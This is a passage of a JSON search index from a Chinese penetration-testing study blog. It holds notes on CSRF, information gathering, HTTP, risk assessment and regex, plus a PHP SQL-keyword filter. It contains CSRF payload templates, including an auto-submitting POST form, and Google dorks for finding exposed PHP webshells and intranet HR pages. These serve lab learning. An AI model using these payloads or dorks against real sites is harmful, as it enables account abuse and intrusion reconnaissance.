dowith_sql($a)&#123; $a &#x3D; str_replace(&quot;and&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;execute&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;update&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;count&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;chr&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;ma&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;master&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;truncate&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;char&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;declare&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;select&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;create&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;delete&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;insert&quot;,&quot;&quot;,$a); &#x2F;&#x2F;$a &#x3D; str_replace(&quot;&#39;&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;\\&quot;&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot; &quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;or&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;&#x3D;&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;%20&quot;,&quot;&quot;,$a); return $a;&#125;","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://s40d1.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第四节 跨站请求伪造（CSRF）漏洞","date":"2020-07-08T11:17:37.000Z","path":"wiki/渗透/Web渗透/学习笔记/第四节 跨站请求伪造（CSRF）漏洞/","text":"[TOC] 0x00 CSRF原理概要1. 概念 CSRF（Cross-Site Request Forgery）是指跨站请求伪造，通常缩写为CSRF或者是XSRF。 也可以这么理解CSRF攻击：攻击者盗用了你的身份（即用了你的COOKIE），以你的名义进行某些非法操作。CSRF能够修改你的密码，使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的财产等。2. 必要条件要完成一次CSRF攻击，受害者必须依次完成三个要素： 登录受信任网站A，并在本地生成Cookie在不登出A的情况下，访问恶意网站B必须是同一浏览器，因为不同浏览器不能相互利用COOKIE 3. 攻击过程原理Web A 为存在CSRF漏洞Web B 为攻击者的恶意网站User C 为Web A的用户 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功； 用户未退出网站A的情况下，在同一浏览器中访问网站B； 网站B接收到用户请求后，返回攻击代码，并发出一个请求要求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。 网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致网站B的恶意代码被执行。 4. CSRF与XSS的区别XSS：攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击攻击者需要登录后台完成攻击 CSRF：攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击攻击是管理员自己实现的，攻击者只负责了构造代码 CSRF少了获取cookie的步骤，为什么会少了呢。因为受害人在执行恶意代码的时候就已经完成了攻击，而攻击者并没有参与进来。 0x01 漏洞分类1. GET型CSRF这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： 1&lt;img src&#x3D;http:&#x2F;&#x2F;漏洞地址&gt; 在访问含有这个img的页面后，成功向http://漏洞地址，发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。 2. POST型CSRF这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如： 1234&lt;form action&#x3D;http:&#x2F;&#x2F;漏洞地址 method&#x3D;POST&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。 3. 常用的CSRF方式123456789101112131415&lt;img&gt;标签属性&lt;img src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;&lt;script&gt;标签属性&lt;script src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;&lt;iframe&gt;标签属性&lt;iframe src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;JavaScript方法Image对象&lt;script&gt;var foo &#x3D; new Image();foo.src &#x3D; “http:&#x2F;&#x2F;漏洞地址”&lt;&#x2F;script&gt; 0x02 攻击演示以bWAPP的CSRF (Transfer Amount)为例入图，原始账户金额为1000EUR使用burpsuite抓包构造POC对生成的POC内转账金额参数值修改将此poc页面放入本地服务器（恶意服务器）在原浏览器访问本地该页面，点击Submit request结果发现账户金额变为800EUR，表示攻击成功 0x03 漏洞检测自动检测：AWVS扫描器半自动检测：CSRFTester 0x04 漏洞防御1、验证HTTP Referer字段2、Token验证3、添加验证码","tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://s40d1.github.io/tags/CSRF/"}],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第二节 信息收集","date":"2020-07-07T14:10:37.000Z","path":"wiki/渗透/Web渗透/学习笔记/第二节 信息收集/","text":"0x00信息收集的概念黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动。 0x01信息收集的作用 了解安全架构：信息收集使攻击者能够了解组织完整的安全架构 缩小攻击范围：通过IP地址范围、网络、域名、远程访问点等信息，可以缩小攻击范围 建立信息数据库：攻击者能够建立他们自己的相关目标组织安全性弱点的信息数据库来采取下一步的入侵行动 描绘网络拓扑：攻击者可以描绘出目标组织的网络拓扑图，分析最容易进入的攻击路径 *信息收集对于渗透来说是非常重要的一步，收集的信息越详细对以后渗透测试的影响越大，毫不夸张的说，信息的收集决定着渗透的成功与否* 0x02信息收集的分类 被动信息收集：被动信息收集也就是说不会与目标服务器做直接的交互、在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集，例如：网站的whois信息、DNS信息、管理员以及工作人员的个人信息等等。 主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。例如：主机开发的端口、站点的目录结构等等。 0x03信息收集的内容 网络信息 系统信息 组织信息 域名 用户和用户组名 员工信息 内网域名 系统标示banner 组织网站 网段 路由表 公司地址 授权可访问的IP地址 SNMP信息 信息详情 内部网站 系统架构 地址和电话号码 开放的TCP/UDP端口 远程系统类型 邮箱地址 访问控制机制和ACL 系统用户名 HTML代码中的注释 运行的网络协议 密码 实行的安全策略 VPN接入点 站点目录 与组织相关的WEB服务 访问控制策略 测试/临时文件 组织的背景 运行的IDS监听策略 发布的新闻 模拟、数字电话号码 认证机制 系统评估措施 防火墙等安全设施 0x04信息收集的方法方法概览：搜索引擎，网站，邮件，竞争情报，Google，whois，DNS，网络信息收集，社会工程学，社交网站。 地理位置使用在线地图寻找 查询个人信息网站查询 公积金：http://www.bjgjj.gov.cn/ 社保四险：http://www.bjld.gov.cn/csibiz/home/index.html 驾驶证信息：http://www.bjjtgl.gov.cn/publish/portal0/ 工作居住证：http://210.73.77.4/uamsso/ 电子学历：http://www.chsi.com.cn/xlcx/ 信用卡记录：各银行信用卡网站申请进度查询 公交一卡通查询：http://www.bmac.com.cn/Google语法社工库查询网站信息收集目标网站可能提供 使用的软件及版本 使用的操作系统 子目录及参数 文件名、路径、数据库字段名及查询语句 脚本平台 通讯信息和内容管理系统详情使用Burp Suite , Firebug等工具来浏览头部能够提供的信息： 连接状态和内容种类 接收范围 最后编辑信息 X-Powered-By信息 使用的Web服务及版本信息 核查HTML源码可获得： 代码中的注释 web开发或管理员的联系详情 文件系统架构 脚本类型 核查Cookies可获得：使用的软件和它的使用习惯信息使用的脚本平台 邮件信息 Google hacking Site 指定域名 Intext 正文中存在关键字的网页 Intitle 标题中存在关键字的网页 Info 一些基本信息 Inurl url存在关键字的网页 Filetype 搜索指定文件类型 例如：“intitle:管理登录 filetype:php” 查询页面标题含有“管理登录”，并且为php类型的网站。 查找利用php webshell1intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php intitle—网页标题Enable stderr—UNIX标准输出和标准错误的缩写filetype—文件类型 访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息1intitle:intranet inurl:intranet+intext:”human resources” shodan搜索引擎Shoudan是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机，工控系统等）的搜索引擎。它在圈子里就像google一样出名。它主要拦截从服务器到客户端的元数据来工作，目前提供超过50个端口的相关搜索。 shodan能找到的设备服务器路由器交换机公共ip打印机网络摄像头加油站的泵Voip电话和所有数据采集监控系统 shodan能做的用户搜索定制项目寻找端口并拦截数据拦截的数据设置索引显示结果 shodan网站信息收集 Google和Shodan的区别Google的爬虫/蜘蛛 抓取网页数据并为网页内容创建索引。Shoudan主要寻找端口并抓取拦截到的信息，然后为它们建立索引，最后显示结果。Shoudan并不像google那样为网页内容建立索引，因此它是一个基于拦截器的搜索引擎。 whois信息收集Whois可以获取的信息 通过Whois信息可以？) DNS查询","tags":[{"name":"渗透测试;信息收集","slug":"渗透测试-信息收集","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第一节 HTTP请求流程","date":"2020-07-07T11:17:37.000Z","path":"wiki/渗透/Web渗透/学习笔记/第一节 HTTP请求流程/","text":"0x01 HTTP协议分析123sequenceDiagram客户端-&gt;&gt;服务器: 1、request服务器-&gt;&gt;客户端: 2、response 0x02 HTTP请求与响应1.请求12345POST &#x2F;test.php HTTP&#x2F;1.1 &#x2F;&#x2F;请求行HOST：www.test.com &#x2F;&#x2F;请求头User-Agent：Mozilla&#x2F;5.0 （windows NT 6.1；rv：15.0）Gecko&#x2F;20100101 Firefox&#x2F;15.0 &#x2F;&#x2F;空白行，代表请求头结束Username&#x3D;admin&amp;password&#x3D;admin &#x2F;&#x2F;请求正文 2.响应12345678910111213HTTP&#x2F;1.1 200 OK &#x2F;&#x2F;响应行Date: Sun, 15 Nov 2015 11:02:04 GMT &#x2F;&#x2F;响应头Server: bfe&#x2F;1.0.8.9Content-Length: 2605Content-Type: application&#x2F;javascriptCache-Control: max-age&#x3D;315360000Expires: Fri, 13 Jun 2025 09:54:00 GMTContent-Encoding: gzipSet-Cookie: H_PS_PSSID&#x3D;2022_1438_1944_1788; path&#x3D;&#x2F;; domain&#x3D;test.comConnection: keep-alive &#x2F;&#x2F;空白行，代表响应头结束&lt;html&gt;&lt;head&gt;&lt;title&gt; Index.html &lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &#x2F;&#x2F;响应正文或者叫消息主题 0x03 HTTP请求方法 GET：GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（非HTML），那么返回文本是Web容器解析后的HTML源代码。GET请求没有消息主体，因此在消息头后的空白行是没有其他数据。 POST：POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容，而POST是有请求内容的。 HEAD：这个请求的功能与GET请求相似，不同之处在于服务器不会再其响应中返回消息主体，因此，这种方法可用于检查某一资源在向其提交GET请求前是否存在。 PUT：PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据。向服务器上传指定的资源。 0x04 HTTP状态码 1xx：信息提示，表示请求已被成功接收，继续处理。 2xx：请求被成功提交。 3xx：客户端被重定向到其他资源。 4xx：客户端错误状态码，格式错误或者不存在资源。 5xx：描述服务器内部错误。 常见的状态码描述如下： 200：客户端请求成功，是最常见的状态。 302：重定向。 404：请求资源不存在，是最常见的状态。 400：客户端请求有语法错误，不能被服务器所理解。 401：请求未经授权。 403：服务器收到请求，但是拒绝提供服务。 500：服务器内部错误，是最常见的状态。 503：服务器当前不能处理客户端的请求。 0x05 HTTP消息头请求头 Host 请求报头域主要用于指定被请求资源的Internet主机和端口。 User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。 Referer 包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。当前请求的原始URL地址。 Cookie 是非常重要的请求头，常用来表示请求者的身份等。 Accept 这个消息头用于告诉服务器客户端愿意接受那些内容，比如图像类，办公文档格式等等。 可直接在浏览器中利用的输入点：请求行，请求正文黑客在实际利用中的输入点：请求行，referer，user-agent，cookie，请求正文 响应头 Server 服务器使用的Web服务器名称。 Location 服务器通过这个头告诉浏览器去访问哪个页面，浏览器接收到这个请求之后，通常会立刻访问Location头所指向的页面。用于在重定向响应中说明重定向的目标地址。 Content-Type 这个消息头用于规定主体的内容类型。例如，HTML文档的内容类型text/html。 Content-Encoding 这个消息头为消息主体中的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。 Content-Length 消息头规定消息主体的字节长度。实体头用于指明实体正文的长度，以字节方式存储的十进制数字来表示。 Connection 允许发送指定连接的选项。 0x06 拦截HTTP请求 Fiddler Burp Suite","tags":[{"name":"渗透测试 HTTP协议","slug":"渗透测试-HTTP协议","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTP%E5%8D%8F%E8%AE%AE/"}],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"风险评估相关概念","date":"2020-06-25T16:13:37.000Z","path":"wiki/安全服务/风险评估/风险评估相关概念/","text":"0x00 风险的起源“风险”一次来源已久。最普通的说法是：以打鱼为生的渔民们，每次出行前都要祈祷，祈求神灵保佑自己平安归来。其中祈祷的主要内容就是让神灵保佑自己在出海时候能够风平浪静、满载而归；域名们在长期的捕捞实践中，深深的体会到“风”给他们带来的无法预测和无法确定的危险，在出海打渔的过程中的，“风”即意味着显“险”，“风险”一词因此而得来。 0x01 风险的定义在信息安全，风险（risk）就是指各种威胁导致安全事件发生的可能性及其对组织所造成的负面影响。 0x02 风险的特性 客观性：不以人的意志为转移的客观存在。 必然性：伴随着事物发展不可避免。 社会性：后果对社会的影响很大。（如：天灾人祸） 普遍性：存在于事物之中，贯穿于整个生命的周期。 相对性：因时空等元素变化而变化。 时效性：风险随着时间的推移而产生变化。 不确定性：发生时间、损失、是否发生都不确定。 损失性：风险事件存在，就有造成损失的可能性。 可识别性：通过分析事物的内外因素，可识别风险。 可控性：采取一定的控制措施，可以把风险损失控制在一定的范围内。其中8、9、10可以解释为什么要研究风险。","tags":[{"name":"风险评估 概念","slug":"风险评估-概念","permalink":"https://s40d1.github.io/tags/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0-%E6%A6%82%E5%BF%B5/"}],"categories":[{"name":"安全服务","slug":"安全服务","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"},{"name":"风险评估","slug":"安全服务/风险评估","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"}]},{"title":"正则表达式30分钟入门40分钟进阶","date":"2020-06-23T16:13:37.000Z","path":"wiki/安全开发/正则表达式/正则表达式30分钟入门40分钟进阶/","text":"正则练习网址： https://www.codejiaonang.com/正则在线测试网站： https://regexr-cn.com/ 一、正则表达式入门1.1字符组正则表达式中字符组使用中括号（[]）包裹，作用是匹配中括号里面的元素任意一次。如下： 1.1.1字符组中横杠（-）表示区间字符组中可以使用横杠来表示区间，省去大量写操作。如图： 1.1.2特殊字符需转义如果需要再字符组内对横杠(包括其他特殊字符)进行匹配，需要再“-”前面加上转义字符： 1.1.3取反如果不想取某一类字符可使用“^”对其取反，如下图： 总结 1.2快捷方式1.2.1 \\d匹配数字 \\w匹配字符(特殊字符除外)\\d表示匹配所有数字，\\w表示匹配所有字符，如下图： 1.2.2 \\s匹配空格可以使用\\s来匹配空格和缩进： 1.2.3匹配单词边界匹配内容中完整的单词： 1.2.4快捷方式取反将\\W为\\w的取反，\\D为\\d的取反，\\S为\\s的取反。如： 1.2.4开始和结束目标前使用^可以匹配开始位置字符，在目标后使用$可以匹配结束位置的字符： 1.2.5任意字符使用点（.）可以匹配任意字符（除换行符即\\n）： 1.2.6 可选字符匹配一个可以出现也可以不出现的字符： 总结 1.3匹配多个数据1.3.1 重复次数在所需要匹配的字符后面加上大括号，里面填充数字，这个数字表示重复的次数： 1.3.2 重复区间使用大括号内的数字区间可匹配响应范围个数的字符：如果在后面加上了?，就会只匹配区间开始数量的字符，在这里?表示非贪婪模式：如果大括号使用前闭后开的形式，表示匹配第一元素开始以上的内容： 1.3.3 开闭区间+相当于{1，}，*相当于{0，}： 1.3.4 匹配所有手机号码 1.3.4 匹配所有网址 二、正则表达式进阶2.1分组与溯回引用2.1.1分组在正则表达式中还提供了一种将表达式分组的机制，当使用分组时，除了获得整个匹配。还能够在匹配中选择每一个分组。要实现分组使用()即可。如下： 2.1.2 或者条件使用分组的同时还可以使用 或者（or）条件： 2.1.3 非捕获分组有时候，我们并不需要捕获某个分组的内容，但是又想使用分组的特性。这个时候就可以使用非捕获组(?:表达式)，从而不捕获数据，还能使用分组的功能。 2.1.4 回溯引用那如果想让后面分组的正则和第一个分组的正则匹配同样的数据可以使用分组的回溯引用，使用\\N可以引用编号为N的分组，如下： 2.2先行断言2.2.1 正向先行断言正向先行断言：(?=表达式)，指在某个位置向右看，表示所在位置右侧必须能匹配表达式，但只提取该位置的数据： 2.2.1 反向先行断言反向先行断言(?!表达式)的作用是保证右边不能出现某字符 2.3后行断言正向后行断言正向后行断言：(?&lt;=表达式)，指在某个位置向左看，表示所在位置左侧必须能匹配表达式 反向后行断言反向后行断言：(?&lt;!表达式)，指在某个位置向左看，表示所在位置左侧不能匹配表达式","tags":[{"name":"正则 表达式","slug":"正则-表达式","permalink":"https://s40d1.github.io/tags/%E6%AD%A3%E5%88%99-%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"categories":[{"name":"安全开发","slug":"安全开发","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"正则表达式","slug":"安全开发/正则表达式","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"article title","date":"2020-06-23T16:13:37.000Z","path":"wiki/渗透/IOT渗透/第一篇文章/","text":"第一篇文章","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"IOT渗透","slug":"渗透/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"}]}],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"学习笔记","slug":"渗透/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"数据库","slug":"数据库","permalink":"https://s40d1.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"应急响应","slug":"应急响应","permalink":"https://s40d1.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"IOT渗透","slug":"渗透/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"},{"name":"安全服务","slug":"安全服务","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"},{"name":"风险评估","slug":"安全服务/风险评估","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"name":"安全开发","slug":"安全开发","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"正则表达式","slug":"安全开发/正则表达式","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://s40d1.github.io/tags/XSS/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://s40d1.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"CSRF","slug":"CSRF","permalink":"https://s40d1.github.io/tags/CSRF/"},{"name":"渗透测试;信息收集","slug":"渗透测试-信息收集","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"渗透测试 HTTP协议","slug":"渗透测试-HTTP协议","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTP%E5%8D%8F%E8%AE%AE/"},{"name":"风险评估 概念","slug":"风险评估-概念","permalink":"https://s40d1.github.io/tags/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0-%E6%A6%82%E5%BF%B5/"},{"name":"正则 表达式","slug":"正则-表达式","permalink":"https://s40d1.github.io/tags/%E6%AD%A3%E5%88%99-%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]}